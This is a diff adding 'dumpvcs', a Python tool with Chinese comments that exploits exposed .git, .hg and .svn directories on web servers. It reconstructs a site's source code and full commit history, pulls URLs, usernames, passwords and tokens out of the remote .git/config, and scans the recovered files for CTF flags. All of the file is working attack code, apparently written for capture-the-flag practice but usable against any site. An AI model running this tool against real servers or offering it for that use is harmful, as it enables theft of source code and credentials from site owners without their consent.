@@ -1,0 +1,768 @@
+#!/usr/bin/env python3
+# dumpvcs -- 版本控制(VCS)目录泄露统一恢复工具（整合 gitdump + hgdump + svndump）
+# 用法: dumpvcs <auto|git|hg|svn> <URL> [--out 目录] [--list] [--cat 文件] [--jobs N]
+# 特性: 纯 Python3 stdlib，跨平台（Linux/macOS/Windows），零依赖
+# auto = 自动探测 VCS 类型（探测 /.git/HEAD、/.svn/wc.db、/.hg/requires）
+# git  = .git 泄露: index/logs/HEAD/stash + BFS 对象下载 + 全历史文件恢复 + flag 扫描
+# hg   = .hg  泄露: 固定结构探测 + fncache 动态清单 + revlog v1 解压 + flag 扫描
+# svn  = .svn 泄露: wc.db(NODES/PRISTINE) + 完整 40 位 pristine 下载 + flag 扫描
+# 仓库: /home/a/hackingtools/web/信息泄露/dumpvcs
+
+import sys, os, zlib, struct, re, sqlite3, argparse, tempfile
+from concurrent.futures import ThreadPoolExecutor
+import urllib.request, urllib.error
+
+UA = 'dumpvcs/1.0'
+
+
+def make_fetcher(base):
+    def fetch(rel):
+        req = urllib.request.Request(base + rel, headers={'User-Agent': UA})
+        try:
+            with urllib.request.urlopen(req, timeout=10) as r:
+                return r.read()
+        except Exception:
+            return None
+    return fetch
+
+
+def parallel_map(fn, items, jobs):
+    if jobs <= 1:
+        return [fn(x) for x in items]
+    with ThreadPoolExecutor(max_workers=jobs) as ex:
+        return list(ex.map(fn, items))
+
+
+# ---------------------------------------------------------------------------
+# git: .git 目录泄露恢复（gitdump 移植）
+# ---------------------------------------------------------------------------
+
+def cmd_git(url, out, jobs=1):
+    url = url.rstrip('/')
+    if url.endswith('/.git'):
+        url = url[:-len('/.git')]
+    objects_dir = os.path.join(out, '.git', 'objects')
+    fetch = make_fetcher(url)
+
+    def download_object(fetch, objects_dir, sha):
+        p = os.path.join(objects_dir, sha[:2], sha[2:])
+        if os.path.exists(p):
+            return True
+        d = fetch('/.git/objects/' + sha[:2] + '/' + sha[2:])
+        if d is None:
+            return False
+        try:
+            zlib.decompress(d)
+        except Exception:
+            return False
+        os.makedirs(os.path.dirname(p), exist_ok=True)
+        with open(p, 'wb') as f:
+            f.write(d)
+        return True
+
+    def parse_object(objects_dir, sha):
+        p = os.path.join(objects_dir, sha[:2], sha[2:])
+        with open(p, 'rb') as f:
+            raw = zlib.decompress(f.read())
+        nul = raw.index(b'\x00')
+        hdr = raw[:nul].decode()
+        body = raw[nul + 1:]
+        kind, _, size = hdr.partition(' ')
+        return kind, int(size), body
+
+    def scan_tree(body):
+        names = []
+        blobs = []
+        pos = 0
+        while pos < len(body):
+            sp = body.index(b' ', pos)
+            mode = body[pos:sp].decode()
+            pos = sp + 1
+            nul = body.index(b'\x00', pos)
+            name = body[pos:nul].decode('utf-8', 'replace')
+            pos = nul + 1
+            sha = body[pos:pos + 20].hex()
+            pos += 20
+            names.append((name, sha, mode))
+            if mode != '40000':
+                blobs.append(sha)
+        return names, blobs
+
+    print('[*] 目标: ' + url)
+    os.makedirs(objects_dir, exist_ok=True)
+
+    # 1. 下载 index, 解析 DIRC 条目
+    idx = fetch('/.git/index')
+    known_blobs = set()
+    known_paths = set()
+    if idx and idx[:4] == b'DIRC':
+        _, ver, count = struct.unpack('>4sII', idx[:12])
+        pos = 12
+        for i in range(count):
+            e = idx[pos:pos + 62]
+            if len(e) < 62:
+                break
+            sha = e[40:60].hex()
+            flags, = struct.unpack('>H', e[60:62])
+            plen = flags & 0x0FFF
+            ext = bool(flags & 0x4000)
+            plen0 = plen
+            pos += 62
+            if ext:
+                pos += 8
+            path = idx[pos:pos + plen0].decode('utf-8', 'replace')
+            known_paths.add(path)
+            known_blobs.add(sha)
+            pos += plen0
+            pos += 8 - ((pos - 12) % 8) if (pos - 12) % 8 else 0
+        print(f'[*] index: {count} 个文件, 起始对象 {len(known_blobs)}')
+    else:
+        print('[!] index 不可用, 仅按日志恢复')
+
+    # 2. 下载 logs/HEAD 拿全部 commit
+    commits = []
+    log = fetch('/.git/logs/HEAD')
+    if log:
+        for line in log.decode('utf-8', 'replace').splitlines():
+            parts = line.split()
+            if len(parts) >= 2 and re.fullmatch(r'[0-9a-f]{40}', parts[1]):
+                sha = parts[1]
+                msg = ' '.join(parts[6:])
+                commits.append((sha, msg))
+        print(f'[*] 日志: {len(commits)} 次提交')
+    else:
+        print('[!] logs/HEAD 不可用')
+
+    # 2.5 stash 探测
+    stash_found = 0
+    ref_stash = fetch('/.git/refs/stash')
+    if ref_stash and re.fullmatch(r'[0-9a-f]{40}', ref_stash.decode('utf-8', 'replace').strip()):
+        sha = ref_stash.decode().strip()
+        commits.append((sha, 'stash: (refs/stash)'))
+        stash_found += 1
+    stash_log = fetch('/.git/logs/refs/stash')
+    if stash_log:
+        for line in stash_log.decode('utf-8', 'replace').splitlines():
+            parts = line.split()
+            if len(parts) >= 2 and re.fullmatch(r'[0-9a-f]{40}', parts[1]):
+                sha = parts[1]
+                msg = ' '.join(parts[6:])
+                commits.append((sha, 'stash: ' + msg))
+                stash_found += 1
+    if stash_found:
+        print(f'[*] stash: 发现 {stash_found} 条 stash 记录')
+
+    # 3. BFS 下载 objects
+    seen = set()
+    stack = [c[0] for c in commits]
+    if not stack:
+        head = fetch('/.git/HEAD')
+        if head and head.startswith(b'ref:'):
+            ref = head.decode().split('ref:')[1].strip()
+            d = fetch('/.git/' + ref)
+            if d and re.fullmatch(r'[0-9a-f]{40}', d.decode('utf-8', 'replace').strip()):
+                stack.append(d.decode().strip())
+        elif head and re.fullmatch(r'[0-9a-f]{40}', head.decode().strip()):
+            stack.append(head.decode().strip())
+
+    all_blobs = set(known_blobs)
+    download_count = 0
+    while stack:
+        sha = stack.pop()
+        if sha in seen:
+            continue
+        seen.add(sha)
+        if not download_object(fetch, objects_dir, sha):
+            continue
+        download_count += 1
+        kind, size, body = parse_object(objects_dir, sha)
+        if kind == 'commit':
+            for m in re.finditer(rb'^(parent|tree) ([0-9a-f]{40})', body, re.M):
+                stack.append(m.group(2).decode())
+        elif kind == 'tree':
+            names, blobs = scan_tree(body)
+            for n, s, mode in names:
+                stack.append(s)
+            for b in blobs:
+                all_blobs.add(b)
+
+    # 批量补下载 blob（--jobs>1 时并发）
+    missing = [b for b in all_blobs if b not in seen]
+    if jobs > 1:
+        ok = parallel_map(lambda s: download_object(fetch, objects_dir, s), missing, jobs)
+        download_count += sum(1 for x in ok if x)
+        seen.update(missing)
+    else:
+        for b in missing:
+            stack.append(b)
+        while stack:
+            sha = stack.pop()
+            if sha in seen:
+                continue
+            seen.add(sha)
+            if download_object(fetch, objects_dir, sha):
+                download_count += 1
+
+    print(f'[*] 下载对象: {download_count}')
+
+    # 4. 恢复文件: 对每个 commit, 解析 tree 链
+    def resolve_tree(objects_dir, sha):
+        files = {}
+        stack = [sha]
+        while stack:
+            t = stack.pop()
+            kind, size, body = parse_object(objects_dir, t)
+            names, blobs = scan_tree(body)
+            for name, s, mode in names:
+                if mode == '40000':
+                    stack.append(s)
+                else:
+                    files[name] = s
+        return files
+
+    print()
+    print('[+] 提交历史:')
+    for sha, msg in commits:
+        print(f'    {sha[:7]}  {msg}')
+    if not commits:
+        print('    (无日志)')
+
+    print()
+    print('[+] 恢复文件:')
+    all_files = set()
+    printed = set()
+    for sha, msg in commits:
+        if not download_object(fetch, objects_dir, sha):
+            continue
+        kind, size, body = parse_object(objects_dir, sha)
+        if kind != 'commit':
+            continue
+        m = re.search(rb'(^|\n)tree ([0-9a-f]{40})', body)
+        if not m:
+            continue
+        tree_sha = m.group(2).decode()
+        try:
+            files = resolve_tree(objects_dir, tree_sha)
+        except Exception:
+            continue
+        all_files.update(files.keys())
+        if sha not in printed:
+            printed.add(sha)
+            label = msg or 'none'
+            print(f'    commit {sha[:7]} ({label}):')
+            for name in sorted(files):
+                print(f'        {name}')
+
+    # 5. 提取并写出所有 blob 内容（同名文件优先取 stash 版本，其次最新 commit）
+    os.makedirs(out, exist_ok=True)
+    count = 0
+    for name in sorted(all_files):
+        chosen = None
+        chosen_msg = None
+        for sha, msg in commits:
+            if not download_object(fetch, objects_dir, sha):
+                continue
+            kind, size, body = parse_object(objects_dir, sha)
+            if kind != 'commit':
+                continue
+            m = re.search(rb'(^|\n)tree ([0-9a-f]{40})', body)
+            if not m:
+                continue
+            tree_sha = m.group(2).decode()
+            try:
+                files = resolve_tree(objects_dir, tree_sha)
+            except Exception:
+                continue
+            if name in files:
+                if msg.startswith('stash:'):
+                    chosen = files[name]
+                    chosen_msg = msg
+                    break
+                if chosen is None:
+                    chosen = files[name]
+                    chosen_msg = msg
+        if chosen is not None:
+            blob = chosen
+            p = os.path.join(objects_dir, blob[:2], blob[2:])
+            if os.path.exists(p):
+                with open(p, 'rb') as f:
+                    raw = zlib.decompress(f.read())
+                _, _, bbody = parse_object(objects_dir, blob)
+                dest = os.path.join(out, name)
+                os.makedirs(os.path.dirname(dest) or out, exist_ok=True)
+                with open(dest, 'wb') as f:
+                    f.write(bbody)
+                count += 1
+    print(f'[+] 写出文件: {count} 个 -> {out}/')
+    print('    提示: 被删除的文件在历史提交里, 用 git log 与 git show <commit>:<file> 找回')
+
+    # git config 凭据线索
+    cfg = fetch('/.git/config')
+    if cfg:
+        text = cfg.decode('utf-8', 'replace')
+        interesting = [l for l in text.splitlines()
+                       if re.search(r'url\s*=|user\s*=|password|token|credential', l, re.I)]
+        if interesting:
+            print('\n[+] .git/config 线索:')
+            for l in interesting:
+                print('    ' + l.strip())
+
+    # flag 扫描: 遍历恢复出的文件
+    print('\n[+] 扫描结果:')
+    flag_found = False
+    for root, dirs, files in os.walk(out):
+        for fn in files:
+            fp = os.path.join(root, fn)
+            try:
+                with open(fp, 'rb') as f:
+                    data = f.read()
+            except Exception:
+                continue
+            if not data or b'\x00' in data[:512]:
+                continue
+            s = data.decode('utf-8', errors='replace')
+            lines = [l for l in s.splitlines() if 'flag' in l.lower() or 'ctfhub{' in l]
+            if lines:
+                print(f'    {os.path.relpath(fp, out)}:')
+                for l in lines:
+                    print(f'        {l}')
+                flag_found = True
+    if not flag_found:
+        print('    (未自动发现 flag，请手动检查还原文件)')
+
+
+# ---------------------------------------------------------------------------
+# hg: .hg(Mercurial) 泄露自动利用（hgdump 移植）
+# ---------------------------------------------------------------------------
+
+def load_revlog(data):
+    """解析 revlog v1，返回 [(node_hex, base_rev, full_text_or_None)]"""
+    if not data or len(data) < 64:
+        return []
+
+    z0 = int.from_bytes(data[8:12], 'big')
+    if z0 > 0 and len(data) > 64 and data[64:65] == b'\x78':
+        inline = True
+    else:
+        inline = False
+
+    revs = []
+    pos = 0
+    i = 0
+
+    while pos + 64 <= len(data):
+        e = data[pos:pos + 64]
+        zlen = int.from_bytes(e[8:12], 'big')
+        base = int.from_bytes(e[16:20], 'big')
+        node = e[32:52].hex()
+
+        if zlen == 0:
+            revs.append((node, base, None))
+            pos += 64
+            i += 1
+            continue
+
+        if inline:
+            chunk = data[pos + 64: pos + 64 + zlen]
+            pos += 64 + zlen
+        else:
+            off = int.from_bytes(e[0:6], 'big')
+            chunk = data[off: off + zlen]
+            pos += 64
+
+        try:
+            text = zlib.decompress(chunk)
+        except Exception:
+            text = None
+
+        is_full = (base == i) or (base == i and i == 0)
+        revs.append((node, base, text if is_full else None))
+        i += 1
+
+    return revs
+
+
+def decode_store_name(name):
+    """data/flag_xxx.txt.i → 还原文件名 flag_xxx.txt"""
+    s = name
+    if s.startswith('data/'):
+        s = s[5:]
+    if s.endswith('.i'):
+        s = s[:-2]
+    elif s.endswith('.d'):
+        s = s[:-2]
+    elif s.endswith('.df'):
+        s = s[:-3]
+    if s.startswith('_'):
+        s = '.' + s[1:]
+    return s
+
+
+def cmd_hg(url, out, list_only=False, cat_path=None, jobs=1):
+    url = url.rstrip('/')
+    if not url.endswith('.hg'):
+        url += '/.hg'
+    url += '/'
+    fetch = make_fetcher(url)
+
+    if out is None:
+        host = url.split('://', 1)[-1].replace('/', '_').replace(':', '_')
+        out = f'hgdump_{host}'
+
+    print(f'[*] 目标: {url}')
+    seed = [
+        '/requires',
+        '/dirstate',
+        '/store/fncache',
+        '/store/00changelog.i',
+        '/store/00manifest.i',
+    ]
+
+    fncache = None
+    results = {}
+
+    for path in seed:
+        data = fetch(path)
+        status = 200 if data else 404
+        size = len(data) if data else 0
+        print(f'    [{status}] {path} ({size} B)')
+        results[path] = (status, data)
+        if path == '/store/fncache' and data and status == 200:
+            fncache = data.decode('utf-8', errors='replace').strip()
+
+    if not fncache:
+        print('[!] fncache 未获取（404/网络错误），无法枚举文件')
+        sys.exit(1)
+
+    store_files = [l for l in fncache.splitlines() if l.strip()]
+    print(f'[*] fncache 文件数: {len(store_files)}')
+    for f in store_files:
+        print(f'    {f}')
+
+    if list_only:
+        sys.exit(0)
+
+    os.makedirs(out, exist_ok=True)
+
+    def get_store(sp):
+        raw = fetch('/store/' + sp)
+        if raw is None and sp.endswith('.i'):
+            alt = sp[:-1] + 'd'
+            raw2 = fetch('/store/' + alt)
+            if raw2:
+                return alt, raw2
+        return sp, raw
+
+    targets = [sp for sp in store_files if sp.startswith('data/')]
+    fetched = parallel_map(get_store, targets, jobs)
+
+    restored = {}
+    for store_path, raw in fetched:
+        if raw is None:
+            print(f'    [404] {store_path}')
+            continue
+        revs = load_revlog(raw)
+        content = None
+        for node, base, text in reversed(revs):
+            if text is not None:
+                content = text
+                break
+        fname = decode_store_name(store_path)
+        out_path = os.path.join(out, fname)
+        os.makedirs(os.path.dirname(out_path) or out, exist_ok=True)
+        with open(out_path, 'wb') as f:
+            f.write(content or b'')
+        restored[fname] = content
+        print(f'    [+] {store_path} → {fname} ({len(content or b"")} B)')
+
+    print(f'\n[+] 还原文件: {len(restored)} 个 → {out}/')
+
+    if cat_path:
+        if cat_path in restored:
+            content = restored[cat_path]
+            if content:
+                print(f'\n--- {cat_path} ---')
+                print(content.decode('utf-8', errors='replace').strip())
+            else:
+                print(f'[!] {cat_path} 无内容')
+        else:
+            print(f'[!] 未找到 {cat_path}')
+        sys.exit(0)
+
+    print('\n[+] 扫描结果:')
+    flag_found = False
+    for fname, content in sorted(restored.items()):
+        if not content:
+            continue
+        s = content.decode('utf-8', errors='replace').strip()
+        lines = [l for l in s.splitlines() if 'flag' in l.lower() or 'ctfhub{' in l]
+        if lines:
+            print(f'    {fname}:')
+            for l in lines:
+                print(f'        {l}')
+            flag_found = True
+    if not flag_found:
+        print('    (未自动发现 flag，请手动检查还原文件)')
+
+
+# ---------------------------------------------------------------------------
+# svn: SVN 泄露自动利用（svndump 移植）
+# ---------------------------------------------------------------------------
+
+def cmd_svn(url, out, list_only=False, cat_path=None, jobs=1):
+    url = url.rstrip('/')
+    if not url.endswith('.svn'):
+        url += '/.svn'
+    url += '/'
+    fetch = make_fetcher(url)
+
+    if out is None:
+        host = url.split('://', 1)[-1].replace('/', '_').replace(':', '_')
+        out = f'svndump_{host}'
+
+    print(f'[*] 目标: {url}')
+    wcdb = fetch('wc.db')
+    if not wcdb or len(wcdb) < 100:
+        print('[!] wc.db 下载失败或文件过小，可能不是 SVN 1.7+')
+        sys.exit(1)
+    print(f'[*] wc.db: {len(wcdb)} 字节')
+
+    fmt = fetch('format')
+    if fmt:
+        print(f'[*] SVN 格式: {fmt.decode().strip()}')
+
+    tmp = os.path.join(tempfile.gettempdir(), '_svndump_wcdb_tmp')
+    with open(tmp, 'wb') as f:
+        f.write(wcdb)
+    conn = sqlite3.connect(tmp)
+    c = conn.cursor()
+
+    entries = []
+    try:
+        c.execute('SELECT local_relpath, presence, checksum FROM NODES ORDER BY local_relpath, op_depth DESC')
+        rows = c.fetchall()
+    except Exception:
+        try:
+            c.execute('SELECT path, presence, checksum FROM NODES ORDER BY local_relpath, op_depth DESC')
+            rows = c.fetchall()
+        except Exception as e:
+            print(f'[!] NODES 查询失败: {e}')
+            rows = []
+    seen_paths = set()
+    for path, presence, checksum in rows:
+        if path in seen_paths:
+            continue
+        seen_paths.add(path)
+        if presence in ('not-present', 'excluded', 'unversioned', None):
+            continue
+        entries.append((path, presence, checksum))
+
+    pristine_list = []
+    try:
+        c.execute('SELECT checksum FROM PRISTINE')
+        for (cs,) in c.fetchall():
+            if cs and cs not in [e[2] for e in entries if e[2]]:
+                pristine_list.append(cs)
+    except Exception:
+        pass
+
+    conn.close()
+    try:
+        os.unlink(tmp)
+    except Exception:
+        pass
+
+    print(f'[*] 文件条目: {len(entries)}')
+    for path, presence, checksum in entries:
+        cs = (checksum or '').replace('$sha1$', 'sha1$')[:20]
+        print(f'    {path:<40s} {presence:<15s} {cs}')
+
+    if list_only:
+        sys.exit(0)
+
+    def clean_sha(cs):
+        if not cs:
+            return None
+        clean = cs.replace('$sha1$', '').replace('sha1$', '').split('!')[0]
+        return clean if len(clean) == 40 else None
+
+    path_sha = {}
+    for path, presence, checksum in entries:
+        cs = clean_sha(checksum)
+        if cs:
+            path_sha[path] = cs
+
+    all_shas = set(path_sha.values())
+    for cs in pristine_list:
+        s = clean_sha(cs)
+        if s:
+            all_shas.add(s)
+
+    print(f'[*] 需下载: {len(all_shas)} 个 pristine 文件')
+
+    os.makedirs(out, exist_ok=True)
+    downloaded = {}
+
+    def dl(sha):
+        pristine_path = f'pristine/{sha[:2]}/{sha}.svn-base'
+        d = fetch(pristine_path)
+        return sha, d
+
+    if jobs <= 1:
+        count = 0
+        for sha in sorted(all_shas):
+            sha2, data = dl(sha)
+            if data:
+                downloaded[sha2] = data
+                count += 1
+                print(f'    [+] pristine/{sha2[:2]}/{sha2}.svn-base ({len(data)} B)')
+        print(f'[*] 下载完成: {count}/{len(all_shas)}')
+    else:
+        results = parallel_map(dl, sorted(all_shas), jobs)
+        count = 0
+        for sha, data in results:
+            if data:
+                downloaded[sha] = data
+                count += 1
+                print(f'    [+] pristine/{sha[:2]}/{sha}.svn-base ({len(data)} B)')
+        print(f'[*] 下载完成: {count}/{len(all_shas)}')
+
+    written = 0
+    for path, sha in path_sha.items():
+        if sha in downloaded:
+            dest = os.path.join(out, path)
+            os.makedirs(os.path.dirname(dest) or out, exist_ok=True)
+            with open(dest, 'wb') as f:
+                f.write(downloaded[sha])
+            written += 1
+
+    print(f'[+] 写出文件: {written} 个 -> {out}/')
+    print('\n[+] 扫描结果:')
+    for path, sha in path_sha.items():
+        if sha in downloaded:
+            content = downloaded[sha]
+            content_str = content.decode('utf-8', 'replace').strip()
+            print(f'    {path}:')
+            print(f'        {content_str}')
+            if 'ctfhub' in content_str or 'flag' in content_str.lower():
+                print(f'    >>> FLAG <<<')
+
+
+# ---------------------------------------------------------------------------
+# auto: VCS 类型自动探测
+# ---------------------------------------------------------------------------
+
+def detect_vcs(url):
+    """探测 URL 根目录下的 VCS 泄露类型, 返回 git|hg|svn|None"""
+    url = url.rstrip('/')
+    if url.endswith('/.git'):
+        return 'git'
+    if url.endswith('/.hg'):
+        return 'hg'
+    if url.endswith('/.svn'):
+        return 'svn'
+    fetch = make_fetcher(url)
+    probes = [
+        ('git', '/.git/HEAD'),
+        ('hg', '/.hg/requires'),
+        ('svn', '/.svn/wc.db'),
+    ]
+    with ThreadPoolExecutor(max_workers=3) as ex:
+        results = list(ex.map(lambda pr: (pr[0], fetch(pr[1])), probes))
+    for kind, data in results:
+        if data:
+            return kind
+    return None
+
+
+def cmd_auto(url, out=None, list_only=False, cat_path=None, jobs=1):
+    url = url.rstrip('/')
+    kind = detect_vcs(url)
+    if not kind:
+        print('[-] 未检测到 git/hg/svn 泄露（探测过 /.git/HEAD、/.hg/requires、/.svn/wc.db）')
+        sys.exit(1)
+    print(f'[+] 检测到: {kind}')
+    if kind == 'git':
+        cmd_git(url, out or 'gitdump_restore', jobs)
+    elif kind == 'hg':
+        cmd_hg(url, out, list_only, cat_path, jobs)
+    else:
+        cmd_svn(url, out, list_only, cat_path, jobs)
+
+
+# ---------------------------------------------------------------------------
+# CLI
+# ---------------------------------------------------------------------------
+
+HELP_EPILOG = '''子命令:
+  dumpvcs auto <URL> [--out 目录] [--jobs N]
+      自动探测 VCS 类型后直接利用
+  dumpvcs git <URL> [--out 目录] [--jobs N]
+      .git 泄露恢复: index/logs/HEAD/stash → 全历史文件
+  dumpvcs hg <URL> [--out 目录] [--list] [--cat 文件] [--jobs N]
+      .hg 泄露利用: fncache + revlog 解压 → 还原 + 自动 cat flag
+  dumpvcs svn <URL> [--out 目录] [--list] [--cat 文件] [--jobs N]
+      .svn 泄露利用: wc.db + pristine → 还原 + 自动 cat flag
+
+示例:
+  dumpvcs auto http://target/
+  dumpvcs git http://target/.git
+  dumpvcs git http://target/.git --jobs 8
+  dumpvcs hg http://target --cat flag_xxx.txt
+  dumpvcs svn http://target --list'''
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        prog='dumpvcs',
+        description='dumpvcs -- 版本控制(VCS)目录泄露统一恢复工具（git/hg/svn）',
+        epilog=HELP_EPILOG,
+        formatter_class=argparse.RawDescriptionHelpFormatter)
+    sub = parser.add_subparsers(dest='tool', metavar='<auto|git|hg|svn>')
+    sub.required = True
+
+    p_auto = sub.add_parser('auto', help='自动探测 VCS 类型并利用',
+                            description='自动探测: 探测 /.git/HEAD、/.hg/requires、/.svn/wc.db')
+    p_auto.add_argument('url')
+    p_auto.add_argument('--out', default=None, help='输出目录')
+    p_auto.add_argument('--list', action='store_true', help='只列出清单，不下载')
+    p_auto.add_argument('--cat', default=None, help='还原后 cat 指定文件')
+    p_auto.add_argument('--jobs', type=int, default=1, help='并发下载数（默认 1）')
+    p_auto.set_defaults(func=cmd_auto)
+
+    p_git = sub.add_parser('git', help='.git 目录泄露恢复',
+                           description='gitdump 移植: .git 泄露 → 恢复所有历史提交文件清单')
+    p_git.add_argument('url')
+    p_git.add_argument('--out', default='gitdump_restore', help='输出目录（默认 gitdump_restore）')
+    p_git.add_argument('--jobs', type=int, default=1, help='并发下载数（默认 1）')
+    p_git.set_defaults(func=cmd_git)
+
+    def mk(name, desc, usage):
+        p = sub.add_parser(name, help=desc, description=desc,
+                           usage=usage)
+        p.add_argument('url')
+        p.add_argument('--out', default=None, help='输出目录（默认 <name>dump_<host>）')
+        p.add_argument('--list', action='store_true', help='只列出清单，不下载')
+        p.add_argument('--cat', default=None, help='还原后 cat 指定文件')
+        p.add_argument('--jobs', type=int, default=1, help='并发下载数（默认 1）')
+        return p
+
+    p_hg = mk('hg', '.hg(Mercurial) 泄露自动利用（fncache + revlog 解压）',
+              'dumpvcs hg <URL> [--out 目录] [--list] [--cat 文件] [--jobs N]')
+    p_hg.set_defaults(func=cmd_hg)
+
+    p_svn = mk('svn', '.svn 泄露自动利用（wc.db 解析 + pristine 下载）',
+               'dumpvcs svn <URL> [--out 目录] [--list] [--cat 文件] [--jobs N]')
+    p_svn.set_defaults(func=cmd_svn)
+
+    args = parser.parse_args()
+
+    kwargs = {'url': args.url, 'out': args.out, 'jobs': args.jobs}
+    if args.tool in ('hg', 'svn'):
+        kwargs['list_only'] = args.list
+        kwargs['cat_path'] = args.cat
+    args.func(**kwargs)
+
+
+if __name__ == '__main__':
+    main()
